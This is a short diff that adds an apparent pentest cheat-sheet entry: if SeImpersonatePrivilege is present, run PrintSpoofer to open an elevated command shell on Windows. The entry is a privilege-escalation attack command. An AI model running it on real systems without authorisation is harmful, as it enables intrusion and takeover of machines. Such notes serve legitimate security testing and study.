@@ -1,0 +1,3 @@
+if find SeImpersonatePrivilege permission
+
+PrintSpoofer.exe -i -c cmd
